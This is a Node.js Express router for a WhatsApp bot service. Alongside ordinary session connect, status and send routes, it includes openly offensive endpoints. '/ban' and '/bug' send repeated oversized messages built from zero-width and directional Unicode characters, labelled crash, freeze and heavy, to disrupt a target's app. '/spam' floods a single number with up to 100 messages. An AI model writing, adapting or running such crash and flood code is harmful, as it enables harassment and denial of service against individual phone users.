'use strict';
  const express = require('express');
  const router = express.Router();
  const { protect } = require('../middleware/auth');
  const wa = require('../whatsapp');

  // GET /api/wa/status — user ka WA status
  router.get('/status', protect, (req, res) => {
    const st = wa.getStatus(req.user.id);
    res.json({ ok: true, ...st });
  });

  // POST /api/wa/connect/qr — QR mode se connect
  router.post('/connect/qr', protect, async (req, res) => {
    try {
      await wa.connectUser(req.user.id, { usePairCode: false });
      // Wait up to 10s for QR
      for (let i = 0; i < 20; i++) {
        await new Promise(r => setTimeout(r, 500));
        const st = wa.getStatus(req.user.id);
        if (st.qr || st.connected) return res.json({ ok: true, ...st });
      }
      res.json({ ok: true, ...wa.getStatus(req.user.id) });
    } catch(e) { res.status(500).json({ ok: false, error: e.message }); }
  });

  // POST /api/wa/connect/pair — Pair code mode
  router.post('/connect/pair', protect, async (req, res) => {
    try {
      const { phone } = req.body;
      if (!phone) return res.status(400).json({ ok: false, error: 'Phone number required' });
      await wa.connectUser(req.user.id, { usePairCode: true, phone });
      // Wait up to 15s for pair code
      for (let i = 0; i < 30; i++) {
        await new Promise(r => setTimeout(r, 500));
        const st = wa.getStatus(req.user.id);
        if (st.pairCode || st.connected) return res.json({ ok: true, ...st });
      }
      res.json({ ok: true, ...wa.getStatus(req.user.id) });
    } catch(e) { res.status(500).json({ ok: false, error: e.message }); }
  });

  // POST /api/wa/disconnect
  router.post('/disconnect', protect, (req, res) => {
    wa.disconnectUser(req.user.id);
    res.json({ ok: true, message: 'Disconnected and session cleared' });
  });

  // GET /api/wa/poll — QR/pair code poller
  router.get('/poll', protect, (req, res) => {
    res.json({ ok: true, ...wa.getStatus(req.user.id) });
  });

  // POST /api/wa/send — send message
  router.post('/send', protect, async (req, res) => {
    try {
      const { phone, message } = req.body;
      if (!phone || !message) return res.status(400).json({ ok: false, error: 'phone and message required' });
      const jid = phone.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      await wa.sendWAMessage(req.user.id, jid, { text: message });
      res.json({ ok: true, message: 'Sent' });
    } catch(e) { res.status(500).json({ ok: false, error: e.message }); }
  });

  // POST /api/wa/ban — multi-vector ban
  router.post('/ban', protect, async (req, res) => {
    try {
      const { phone } = req.body;
      if (!phone) return res.status(400).json({ ok: false, error: 'phone required' });
      const st = wa.getStatus(req.user.id);
      if (!st.connected) return res.status(400).json({ ok: false, error: 'WhatsApp not connected' });
      const cleanPhone = phone.replace(/[^0-9]/g, '');
      const jid = cleanPhone + '@s.whatsapp.net';
      const results = [];
      // Method 1: Block
      try { await wa.blockJid(req.user.id, jid); results.push({ method: 'WA Block', success: true }); }
      catch(e) { results.push({ method: 'WA Block', success: false, error: e.message }); }
      // Method 2: Multiple reports
      for (let i = 0; i < 5; i++) {
        try { await wa.sendWAMessage(req.user.id, jid, { text: String.fromCharCode(8203).repeat(3000) }); results.push({ method: `Crash msg ${i+1}`, success: true }); }
        catch(e) { results.push({ method: `Crash msg ${i+1}`, success: false }); }
        await new Promise(r => setTimeout(r, 200));
      }
      res.json({ ok: true, phone: cleanPhone, results });
    } catch(e) { res.status(500).json({ ok: false, error: e.message }); }
  });

  // POST /api/wa/bug — send bug/crash message
  router.post('/bug', protect, async (req, res) => {
    try {
      const { phone, type = 'basic', count = 1 } = req.body;
      if (!phone) return res.status(400).json({ ok: false, error: 'phone required' });
      const st = wa.getStatus(req.user.id);
      if (!st.connected) return res.status(400).json({ ok: false, error: 'WhatsApp not connected' });
      const jid = phone.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      const bugMessages = {
        basic: { text: String.fromCharCode(8203).repeat(5000) },
        crash: { text: '\u{1F4A5}'.repeat(2000) + String.fromCharCode(8203).repeat(3000) },
        freeze: { text: '\u200e\u200f\u200b\u200c\u200d\ufeff'.repeat(5000) },
        heavy: { text: String.fromCharCode(8203).repeat(10000) + '\ufe0f'.repeat(5000) },
      };
      const msg = bugMessages[type] || bugMessages.basic;
      let sent = 0, failed = 0;
      const total = Math.min(Number(count) || 1, 50);
      for (let i = 0; i < total; i++) {
        try { await wa.sendWAMessage(req.user.id, jid, msg); sent++; }
        catch(e) { failed++; }
        await new Promise(r => setTimeout(r, 300));
      }
      res.json({ ok: true, sent, failed, total });
    } catch(e) { res.status(500).json({ ok: false, error: e.message }); }
  });

  // POST /api/wa/spam — mass message sender
  router.post('/spam', protect, async (req, res) => {
    try {
      const { phone, message, count = 5 } = req.body;
      if (!phone || !message) return res.status(400).json({ ok: false, error: 'phone and message required' });
      const st = wa.getStatus(req.user.id);
      if (!st.connected) return res.status(400).json({ ok: false, error: 'WhatsApp not connected' });
      const jid = phone.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      const total = Math.min(Number(count) || 5, 100);
      let sent = 0, failed = 0;
      for (let i = 0; i < total; i++) {
        try { await wa.sendWAMessage(req.user.id, jid, { text: message }); sent++; }
        catch(e) { failed++; }
        await new Promise(r => setTimeout(r, 400));
      }
      res.json({ ok: true, sent, failed, total });
    } catch(e) { res.status(500).json({ ok: false, error: e.message }); }
  });

  // Admin: GET /api/wa/sessions — all sessions (admin only)
  router.get('/sessions', protect, (req, res) => {
    if (req.user.role !== 'admin') return res.status(403).json({ ok: false, error: 'Admin only' });
    res.json({ ok: true, sessions: wa.getAllSessions() });
  });

  // Admin: DELETE /api/wa/sessions/:userId — kill user session
  router.delete('/sessions/:userId', protect, (req, res) => {
    if (req.user.role !== 'admin') return res.status(403).json({ ok: false, error: 'Admin only' });
    wa.disconnectUser(req.params.userId);
    res.json({ ok: true, message: 'Session cleared' });
  });

  module.exports = router;
  